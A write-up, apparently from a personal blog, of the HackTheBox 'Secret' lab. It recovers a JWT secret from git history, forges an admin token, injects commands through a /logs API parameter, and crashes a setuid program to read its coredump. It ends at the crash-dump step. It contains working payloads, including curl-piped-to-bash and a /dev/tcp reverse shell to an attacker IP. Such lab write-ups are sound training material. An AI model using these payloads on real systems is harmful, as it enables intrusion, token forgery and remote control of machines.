---
title: "Walk-through of Secret from HackTheBox"
header:
  teaser: /assets/images/2021-11-19-14-47-29.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - JWTTools
  - GitTools
  - PR_SET_DUMPABLE
---

## Machine Information

![secret](/assets/images/2021-11-19-14-47-29.png)

Secret is rated as an easy machine on HackTheBox. We start with a backup found on the website running on the box. In there we find a number of interesting files, which leads us to interacting with an api. Eventually we create a java web token and can perform remote code execution, which we use to get a reverse shell. Escalation to root involves further code review, this time of a c program found on the box. From that we find crashing the program allows us to see the contents of memory via a coredump. And in there we can retrieve the root flag.

<!--more-->

Skills required are web and OS enumeration. Skills learned are XXE exploits and understanding Python scripts to develop an exploit.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Secret](https://www.hackthebox.eu/home/machines/profile/408) |
| Machine Release Date | 30th October 2021 |
| Date I Completed It | 30th November 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/secret]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.120 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/secret]
└─# nmap -p$ports -sC -sV -oA secret 10.10.11.120
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-17 22:18 GMT
Nmap scan report for 10.10.11.120
Host is up (0.023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds
```

Only three open ports, interestingly two of them are nginx. Let's add the box IP to hosts file first:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# echo "10.10.11.120 secret.htb" >> /etc/hosts
```

## Website

Now have a look at the website on port 80:

![secret-website](/assets/images/2021-11-17-22-24-52.png)

Nothing much here, just a static site about documentation. Clicking the Live Demo button takes us here:

![secret-api](/assets/images/2021-11-18-21-33-43.png)

We see an API which we will be interacting with later. Further down the main page we see a link to download the source code:

![secret-download](/assets/images/2021-11-18-21-34-58.png)

## Source Code Review

Let's grab it and have a look:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# wget http://secret.htb/download/files.zip
--2021-11-18 21:35:40--  http://secret.htb/download/files.zip
Resolving secret.htb (secret.htb)... 10.10.11.120
Connecting to secret.htb (secret.htb)|10.10.11.120|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28849603 (28M) [application/zip]
Saving to: ‘files.zip’
files.zip      100%[================>]  27.51M  2.74MB/s    in 9.8s    
2021-11-18 21:35:50 (2.81 MB/s) - ‘files.zip’ saved [28849603/28849603]

┌──(root💀kali)-[~/htb/secret]
└─# unzip files.zip
Archive:  files.zip
   creating: local-web/
   creating: local-web/node_modules/
   creating: local-web/node_modules/get-stream/
  inflating: local-web/node_modules/get-stream/buffer-stream.js  
<SNIP>

┌──(root💀kali)-[~/htb/secret]
└─# cd local-web

┌──(root💀kali)-[~/htb/secret/local-web]
└─# ls -lsa
 4 -rw-rw-r--   1 root root    72 Sep  3 06:59 .env
 4 drwxrwxr-x   8 root root  4096 Sep  8 19:33 .git
 4 -rw-rw-r--   1 root root   885 Sep  3 06:56 index.js
 4 drwxrwxr-x   2 root root  4096 Aug 13 05:42 model
 4 drwxrwxr-x 201 root root  4096 Aug 13 05:42 node_modules
 4 -rw-rw-r--   1 root root   491 Aug 13 05:42 package.json
68 -rw-rw-r--   1 root root 69452 Aug 13 05:42 package-lock.json
 4 drwxrwxr-x   4 root root  4096 Sep  3 06:54 public
 4 drwxrwxr-x   2 root root  4096 Sep  3 07:32 routes
 4 drwxrwxr-x   4 root root  4096 Aug 13 05:42 src
 4 -rw-rw-r--   1 root root   651 Aug 13 05:42 validations.js
```

In the local-web folder we see a lot of files. FIrst one I looked at is .env:

```sh
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat .env          
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Not sure yet what that is for if anything but seems suspicious!

Looking at index.js we see a couple of interesting things:

```sh
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat index.js
<SNIP>
// import routes 
const authRoute = require('./routes/auth');
const webroute = require('./src/routes/web')
<SNIP?
//middle ware 
app.use(express.json());
app.use('/api/user',authRoute)
app.use('/api/', privRoute)
app.use('/', webroute)
<SNIP>
```

There's a file called auth used to set up the app called authRoute which looks to be an API endpoint we can connect to.

Looking at the auth.js file we see a register endpoint:

```java
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat routes/auth.js
<SNIP>
router.post('/register', async (req, res) => {

    // validation
    const { error } = registerValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if user exists
    const emailExist = await User.findOne({email:req.body.email})
    if (emailExist) return res.status(400).send('Email already Exist')

    // check if user name exist 
    const unameexist = await User.findOne({ name: req.body.name })
    if (unameexist) return res.status(400).send('Name already Exist')

    //hash the password
    const salt = await bcrypt.genSalt(10);
    const hashPaswrod = await bcrypt.hash(req.body.password, salt)
```

There's also a login section which checks an account then creates a JSON Web Token (JWT) if valid:

```java
// login

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');

    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);
})
<SNIP>
```

There's also a validation.js file which checks the registration and logins for user are valid. [This](https://stormpath.com/blog/beginners-guide-jwts-in-java) is a good introduction to JWT if you need to read up some before getting too deep.

## Interacting With API

With the information from the config files we now know how to try and create our own user:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "pencer"}'
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 18
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 18 Nov 2021 22:01:46 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 19
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"13-Q2T0jisz/unr9MyMuXKKCS2zU1g"
< 
* Connection #0 to host secret.htb left intact
"email" is required
```

Trying to register a user with just the name field returns a message to say email is required. Let's try again and add a fake address:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "pencer","email": "pencer@test.com"}'  
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 18 Nov 2021 22:02:57 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 22
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"16-nX1arZIZLbLe8Z7xRI3PdssUkSc"
< 
* Connection #0 to host secret.htb left intact
"password" is required
```

That worked, we now get another message this time telling us to provide a password:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "pencer","email": "pencer@test.com","password": "password"}'
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 68
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 18 Nov 2021 22:03:58 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 17
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"11-4CY5YgLTe0ZU3J5xpyOA0EoDRvk"
< 
* Connection #0 to host secret.htb left intact
{"user":"pencer"}
```

With the three required parameters provided we've created our user. Now we can try and login with it:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{"email": "pencer@test.com","password": "password"}' 
*   Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/login HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 51
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 18 Nov 2021 22:04:53 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 205
< Connection: keep-alive
< X-Powered-By: Express
< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk
< ETag: W/"cd-VabnZwBM7Fs1CuX27K9pRNO2gTw"
< 
* Connection #0 to host secret.htb left intact
```

## More Code Review

This worked and as we saw in the config file a JWT has been returned for our user. After another review of the source code I found private.js in the routes folder:

```java
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat routes/private.js 
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

This gives us another endpoint to try called /priv. Interestingly it shows us if we have the username theadmin and provide a valid token we have the admin role, otherwise we're a normal user.

Later in the same file we see there's an endpoint called /logs that will allow us to pass a parameter called file that isn't sanitised if we are theadmin user.

```java
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

So clearly we need to find a way to get a valid JWT for the theadmin. First let's try sending our own users token to the /priv endpoint we've just found:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk'
{"role":{"role":"you are normal user","desc":"pencer"}}
```

With this authentication token we are able to interact with the priv API but as a normal user we can't do a lot.

## JWT Tool

We can decode the JWT using JWT_Tool, let's get it:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# wget https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
--2021-11-17 22:54:00--  https://raw.githubusercontent.com/ticarpi/jwt_tool/master/jwt_tool.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99348 (97K) [text/plain]
Saving to: ‘jwt_tool.py’
jwt_tool.py            100%[==============================================================>]  97.02K  --.-KB/s    in 0.02s
2021-11-17 22:54:00 (3.84 MB/s) - ‘jwt_tool.py’ saved [99348/99348]
```

We pass it the JWT we received as our authenticated user:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi

Original JWT:
=====================
Decoded Token Values:
=====================
Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] _id = "6196cdce425736045c2b2958"
[+] name = "pencer"
[+] email = "pencer@test.com"
[+] iat = 1637273093    ==> TIMESTAMP = 2021-11-18 22:04:53 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

It's decoded the token and shows us the payloads consisting of _id, name and email.

So looking back at what we've found so far. We know that to progress we need to find a way to generate a token for theadmin user. To do that we need a password, we found this earlier:

```sh
┌──(root💀kali)-[~/htb/secret/local-web]
└─# cat .env          
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

## GitTools

Which doesn't work, but one thing we didn't look at before is what's in the .git folder contained in that original download. Let's extract the contents of .git using GitTools:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 229, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
Receiving objects: 100% (229/229), 52.92 KiB | 918.00 KiB/s, done.
Resolving deltas: 100% (85/85), done.

┌──(root💀kali)-[~/htb/secret]
└─# ./GitTools/Extractor/extractor.sh local-web/ secret_git_extracted
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 3a367e735ee76569664bf7754eaaade7c735d702
[+] Found file: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/.env
[+] Found file: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/.env.swp
[+] Found file: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/index.js
[+] Found folder: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/model
[+] Found file: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/model/user.js
[+] Found folder: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/node_modules
[+] Found folder: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/node_modules/.bin
[+] Found folder: /root/htb/secret/secret_git_extracted/0-3a367e735ee76569664bf7754eaaade7c735d702/node_modules/@hapi
<SNIP>
[+] Found folder: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src
[+] Found folder: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/routes
[+] Found file: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/routes/web.js
[+] Found folder: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/views
[+] Found file: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/views/404.ejs
[+] Found file: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/views/doc.ejs
[+] Found file: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/src/views/home.ejs
[+] Found file: /root/htb/secret/secret_git_extracted/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/validations.js
```

It took a while to extract all the files but now we can look at the commits:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# cd secret_git_extracted

┌──(root💀kali)-[~/htb/secret/secret_git_extracted]
└─# ls -l
total 24
drwxr-xr-x 7 root root 4096 Nov 17 22:39 0-3a367e735ee76569664bf7754eaaade7c735d702
drwxr-xr-x 7 root root 4096 Nov 17 22:39 1-de0a46b5107a2f4d26e348303e76d85ae4870934
drwxr-xr-x 7 root root 4096 Nov 17 22:40 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
drwxr-xr-x 7 root root 4096 Nov 17 22:41 3-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
drwxr-xr-x 7 root root 4096 Nov 17 22:41 4-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxr-xr-x 7 root root 4096 Nov 17 22:42 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
```

We have six commits in the git repo. I searched for TOKEN_SECRET which we found before in the .env file of the main folder, and found something interesting:

```sh
┌──(root💀kali)-[~/htb/secret/secret_git_extracted]
└─# grep -rn "TOKEN_SECRET = " | sort
0-3a367e735ee76569664bf7754eaaade7c735d702/.env:2:TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
1-de0a46b5107a2f4d26e348303e76d85ae4870934/.env:2:TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b/.env:2:TOKEN_SECRET = secret
3-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78/.env:2:TOKEN_SECRET = secret
4-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env:2:TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env:2:TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

We can use this secret and our existing user JWT we created earlier with jwt_tool to create ourselves a tampered token that works as theadmin:

## Create theadmin JWT

```sh
┌──(root💀kali)-[~/htb/secret]
└─# python3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.4                \______|             @ticarpi      

Original JWT:
jwttool_a9ca90340bdb619642f0fbd1df1e6f4e - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE
```

## Remote Code Execution

With this new token we can use the /logs api we found earlier and authenticate as theadmin. This let's us use that unsanitised parameter we saw in the source code. Let's try and get the passwd file

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;cat+/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
"80bf34c fixed typos 🎉
0c75212 now we can view logs from server 😃
ab3e953 Added the codes
root:x:0:0:root:/root:/bin/bash
<SNIP>
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash
```

It works and we see the contents of the passwd file. Of note is the user dasith. Let's see which user we are on the server:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
<SNIP>
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)"
```

Ok so we are the dasith user, let's look in their home folder:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;ls+-ls+/home/dasith' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
<SNIP>
 4 drwxrwxr-x 8 dasith dasith   4096 Nov 18 22:14 local-web
 4 -r-------- 1 dasith dasith     33 Nov 18 15:43 user.txt"
```

## User Flag

Might as well grab the user flag:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
<SNIP>
c5d9aea30b9787de4c6776da13f5f57f
```

## Reverse Shell

Now let's get a reverse shell, we can use a simple one like this and put it in a shell file so we can execute it:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# cat pencer_shell.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.15/1338 0>&1'
```

Start a web server so we can pull that file across, also start a netcat listener to catch our shell. Now as before send as a parameter:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# curl 'http://secret.htb/api/logs?file=;curl+http://10.10.15.15/pencer_shell.sh+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'
{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://10.10.15.15/pencer_shell.sh | bash"}
```

We see the file pulled from our web server:

```sh
┌──(root💀kali)-[~/htb/secret]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.120 - - [18/Nov/2021 22:11:37] "GET /pencer_shell.sh HTTP/1.1" 200 -
```

And then we see our shell is connected:

```sh
──(root💀kali)-[~/htb/secret]
└─# nc -lvvp 1337
listening on [any] 1337 ...
connect to [10.10.15.15] from secret.htb [10.10.11.120] 51496
bash: cannot set terminal process group (1116): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

First let's get a better shell:

```sh
dasith@secret:~/local-web$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
dasith@secret:~/local-web$ ^Z
zsh: suspended  nc -lvvp 1337
┌──(root💀kali)-[~/htb/secret]
└─# stty raw -echo; fg
[1]  + continued  nc -lvvp 1337
dasith@secret:~/local-web$
```

## Enumeration

With that sorted I had a look around, eventually finding a file called count that has the sticky bit set:

```text
dasith@secret:~/local-web$ find / -type f -perm -u=s 2>/dev/null
<SNIP>
/opt/count
```

We can assume that is significant. If we look in the /opt folder we also find the source code for the count file:

```text
dasith@secret:/opt$ ls -l
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log

dasith@secret:~/local-web$ file /opt/count
/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped
```

Let's see what this file does:

```sh
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: /tmp/output.txt
```

It asked for a source file, I gave it the root flag and it seems to be doing a character and word count on it. Saving the file doesn't give me the source:

```text
dasith@secret:/opt$ ls /tmp
 output.txt
 snap.lxd
 tmux-1000
 vmware-root_730-2999460803

dasith@secret:/opt$ cat /tmp/output.txt 
Total characters = 33
Total words      = 2
Total lines      = 2
```

I just get the output save to a text file.

## Coredump

Next we need to look through that source code to see if we can understand what the file does. It's a long file, but the we can see it reads the file provided in to memory, where the number of characters and words are counted. The interesting part is near the end:

```text
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
```

We can see what that allows [here](http://manpages.ubuntu.com/manpages/bionic/man2/prctl.2.html):

```text
PR_SET_DUMPABLE (since Linux 2.3.20)
Set the state of the "dumpable" flag, which determines whether core dumps are
produced for the calling process upon delivery of a signal whose default behavior
is to produce a core dump.
```

Which means the program is setting the flag to write a coredump out to a file when it's terminated. We can take advantage of this to get the contents of memory dumped to a file while the root.txt file is held in it.

Get a second shell connected using the same curl method as above. Then in shell 1 we run the count program again and read the root flag in:

```text
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 
```

## Crash Program

Leave it there at the save point and switch to the second shell, look at the processes running:

```text
dasith@secret:~/local-web$ ps -aux | grep count
ps -aux | grep count
root         821  0.0  0.1 235672  7420 ?        Ssl  17:18   0:00 /usr/lib/accountsservice/accounts-daemon
dasith     96020  0.0  0.0   2488   524 pts/9    S+   22:44   0:00 ./count -p
dasith     96026  0.0  0.0   6432   740 ?        S    22:45   0:00 grep --color=auto count
```

Kill the process for count:

```text
dasith@secret:~/local-web$ kill 96020
kill 96020
```

Now unpack the coredump so we can look at it:

```text
dasith@secret:/opt$ cd /var/crash

dasith@secret:/var/crash$ ls -l
